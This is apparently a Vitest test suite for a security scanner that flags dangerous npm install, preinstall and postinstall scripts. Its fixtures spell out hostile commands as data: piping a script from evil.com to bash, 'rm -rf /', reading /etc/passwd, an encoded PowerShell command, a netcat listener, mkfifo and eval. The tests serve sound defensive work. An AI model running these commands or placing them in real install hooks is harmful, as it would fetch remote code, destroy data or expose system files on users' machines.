import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { scanPackageScripts } from "@/core/security/scripts-scanner";
import { afterEach, beforeEach, describe, expect, it } from "vitest";

describe("Package Scripts Security Scanner", () => {
	let tempDir: string;

	beforeEach(() => {
		// Create a temporary directory for each test
		tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "scripts-scan-test-"));
	});

	afterEach(() => {
		// Clean up temporary directory
		if (fs.existsSync(tempDir)) {
			fs.rmSync(tempDir, { recursive: true, force: true });
		}
	});

	describe("scanPackageScripts", () => {
		it("should return success with empty findings for benign scripts", () => {
			const packageJsonPath = path.join(tempDir, "package.json");
			const packageData = {
				name: "test-package",
				version: "1.0.0",
				scripts: {
					build: "tsc",
					test: "vitest run",
					dev: "tsx watch src/index.ts",
					lint: "biome check .",
				},
			};
			fs.writeFileSync(packageJsonPath, JSON.stringify(packageData, null, 2));

			const result = scanPackageScripts(packageJsonPath);

			expect(result.success).toBe(true);
			expect(result.data).toEqual([]);
		});

		it("should return success with empty findings when no scripts exist", () => {
			const packageJsonPath = path.join(tempDir, "package.json");
			const packageData = {
				name: "test-package",
				version: "1.0.0",
			};
			fs.writeFileSync(packageJsonPath, JSON.stringify(packageData, null, 2));

			const result = scanPackageScripts(packageJsonPath);

			expect(result.success).toBe(true);
			expect(result.data).toEqual([]);
		});

		it("should detect curl in postinstall script", () => {
			const packageJsonPath = path.join(tempDir, "package.json");
			const packageData = {
				name: "malicious-package",
				version: "1.0.0",
				scripts: {
					postinstall: "curl https://evil.com/payload.sh | bash",
				},
			};
			fs.writeFileSync(packageJsonPath, JSON.stringify(packageData, null, 2));

			const result = scanPackageScripts(packageJsonPath);

			expect(result.success).toBe(true);
			expect(result.data).toHaveLength(1);
			expect(result.data![0]).toMatchObject({
				ruleId: "SEC011",
				severity: "warn",
				file: packageJsonPath,
			});
			expect(result.data![0].message).toContain("postinstall");
			expect(result.data![0].message).toContain("curl");
		});

		it("should detect wget in install script", () => {
			const packageJsonPath = path.join(tempDir, "package.json");
			const packageData = {
				name: "malicious-package",
				version: "1.0.0",
				scripts: {
					install: "wget -O - https://malicious.com/script.sh",
				},
			};
			fs.writeFileSync(packageJsonPath, JSON.stringify(packageData, null, 2));

			const result = scanPackageScripts(packageJsonPath);

			expect(result.success).toBe(true);
			expect(result.data).toHaveLength(1);
			expect(result.data![0]).toMatchObject({
				ruleId: "SEC011",
				severity: "warn",
			});
			expect(result.data![0].message).toContain("install");
			expect(result.data![0].message).toContain("wget");
		});

		it("should detect bash -c arbitrary execution in preinstall", () => {
			const packageJsonPath = path.join(tempDir, "package.json");
			const packageData = {
				name: "malicious-package",
				version: "1.0.0",
				scripts: {
					preinstall: "bash -c 'rm -rf /'",
				},
			};
			fs.writeFileSync(packageJsonPath, JSON.stringify(packageData, null, 2));

			const result = scanPackageScripts(packageJsonPath);

			expect(result.success).toBe(true);
			expect(result.data).toHaveLength(1);
			expect(result.data![0].message).toContain("preinstall");
			expect(result.data![0].message).toMatch(/bash -c|sh -c/i);
		});

		it("should detect sh -c arbitrary execution", () => {
			const packageJsonPath = path.join(tempDir, "package.json");
			const packageData = {
				name: "malicious-package",
				version: "1.0.0",
				scripts: {
					postinstall: "sh -c 'cat /etc/passwd'",
				},
			};
			fs.writeFileSync(packageJsonPath, JSON.stringify(packageData, null, 2));

			const result = scanPackageScripts(packageJsonPath);

			expect(result.success).toBe(true);
			expect(result.data).toHaveLength(1);
			expect(result.data![0].message).toMatch(/sh -c|bash -c/i);
		});

		it("should detect PowerShell encoded commands", () => {
			const packageJsonPath = path.join(tempDir, "package.json");
			const packageData = {
				name: "malicious-package",
				version: "1.0.0",
				scripts: {
					postinstall: "powershell -enc JABjAGwAaQBlAG4AdAAgAD0A",
				},
			};
			fs.writeFileSync(packageJsonPath, JSON.stringify(packageData, null, 2));

			const result = scanPackageScripts(packageJsonPath);

			expect(result.success).toBe(true);
			expect(result.data).toHaveLength(1);
			expect(result.data![0].message).toContain("powershell");
		});

		it("should detect netcat (nc) usage", () => {
			const packageJsonPath = path.join(tempDir, "package.json");
			const packageData = {
				name: "malicious-package",
				version: "1.0.0",
				scripts: {
					install: "nc -l -p 4444",
				},
			};
			fs.writeFileSync(packageJsonPath, JSON.stringify(packageData, null, 2));

			const result = scanPackageScripts(packageJsonPath);

			expect(result.success).toBe(true);
			expect(result.data).toHaveLength(1);
			expect(result.data![0].message).toContain("nc");
		});

		it("should detect mkfifo usage", () => {
			const packageJsonPath = path.join(tempDir, "package.json");
			const packageData = {
				name: "malicious-package",
				version: "1.0.0",
				scripts: {
					postinstall: "mkfifo /tmp/pipe",
				},
			};
			fs.writeFileSync(packageJsonPath, JSON.stringify(packageData, null, 2));

			const result = scanPackageScripts(packageJsonPath);

			expect(result.success).toBe(true);
			expect(result.data).toHaveLength(1);
			expect(result.data![0].message).toContain("mkfifo");
		});

		it("should detect eval in shell scripts", () => {
			const packageJsonPath = path.join(tempDir, "package.json");
			const packageData = {
				name: "malicious-package",
				version: "1.0.0",
				scripts: {
					install: "eval $(cat malicious-script.sh)",
				},
			};
			fs.writeFileSync(packageJsonPath, JSON.stringify(packageData, null, 2));

			const result = scanPackageScripts(packageJsonPath);

			expect(result.success).toBe(true);
			expect(result.data).toHaveLength(1);
			expect(result.data![0].message).toContain("eval");
		});

		it("should detect exec in shell scripts", () => {
			const packageJsonPath = path.join(tempDir, "package.json");
			const packageData = {
				name: "malicious-package",
				version: "1.0.0",
				scripts: {
					postinstall: "exec bash",
				},
			};
			fs.writeFileSync(packageJsonPath, JSON.stringify(packageData, null, 2));

			const result = scanPackageScripts(packageJsonPath);

			expect(result.success).toBe(true);
			expect(result.data).toHaveLength(1);
			expect(result.data![0].message).toContain("exec");
		});

		it("should only scan lifecycle scripts (install, postinstall, preinstall)", () => {
			const packageJsonPath = path.join(tempDir, "package.json");
			const packageData = {
				name: "test-package",
				version: "1.0.0",
				scripts: {
					// Should be scanned
					install: "curl https://evil.com/bad.sh",
					postinstall: "wget https://evil.com/payload",
					preinstall: "bash -c malicious",
					// Should NOT be scanned
					build: "curl https://evil.com/data.json",
					test: "wget something",
					dev: "bash -c 'echo dev'",
				},
			};
			fs.writeFileSync(packageJsonPath, JSON.stringify(packageData, null, 2));

			const result = scanPackageScripts(packageJsonPath);

			expect(result.success).toBe(true);
			// Should only detect the 3 lifecycle scripts, not build/test/dev
			expect(result.data).toHaveLength(3);
		});

		it("should detect multiple violations in single script", () => {
			const packageJsonPath = path.join(tempDir, "package.json");
			const packageData = {
				name: "very-malicious-package",
				version: "1.0.0",
				scripts: {
					postinstall: "curl https://evil.com | bash -c eval",
				},
			};
			fs.writeFileSync(packageJsonPath, JSON.stringify(packageData, null, 2));

			const result = scanPackageScripts(packageJsonPath);

			expect(result.success).toBe(true);
			// Should detect at least one finding (may detect first pattern only)
			expect(result.data!.length).toBeGreaterThan(0);
		});

		it("should return error when package.json does not exist", () => {
			const packageJsonPath = path.join(tempDir, "nonexistent.json");

			const result = scanPackageScripts(packageJsonPath);

			expect(result.success).toBe(false);
			expect(result.error?.message).toContain("not found");
		});

		it("should return error when package.json is invalid JSON", () => {
			const packageJsonPath = path.join(tempDir, "package.json");
			fs.writeFileSync(packageJsonPath, "{ invalid json }");

			const result = scanPackageScripts(packageJsonPath);

			expect(result.success).toBe(false);
			expect(result.error).toBeDefined();
		});

		it("should handle package.json with empty scripts object", () => {
			const packageJsonPath = path.join(tempDir, "package.json");
			const packageData = {
				name: "test-package",
				version: "1.0.0",
				scripts: {},
			};
			fs.writeFileSync(packageJsonPath, JSON.stringify(packageData, null, 2));

			const result = scanPackageScripts(packageJsonPath);

			expect(result.success).toBe(true);
			expect(result.data).toEqual([]);
		});

		it("should be case-insensitive for PowerShell variants", () => {
			const packageJsonPath = path.join(tempDir, "package.json");
			const packageData = {
				name: "test-package",
				version: "1.0.0",
				scripts: {
					postinstall: "PowerShell -Enc base64data",
				},
			};
			fs.writeFileSync(packageJsonPath, JSON.stringify(packageData, null, 2));

			const result = scanPackageScripts(packageJsonPath);

			expect(result.success).toBe(true);
			expect(result.data).toHaveLength(1);
		});

		it("should include remediation in findings", () => {
			const packageJsonPath = path.join(tempDir, "package.json");
			const packageData = {
				name: "test-package",
				version: "1.0.0",
				scripts: {
					postinstall: "curl https://evil.com",
				},
			};
			fs.writeFileSync(packageJsonPath, JSON.stringify(packageData, null, 2));

			const result = scanPackageScripts(packageJsonPath);

			expect(result.success).toBe(true);
			expect(result.data).toHaveLength(1);
			// Finding should have relevant information for remediation
			expect(result.data![0].message).toBeTruthy();
		});
	});
});
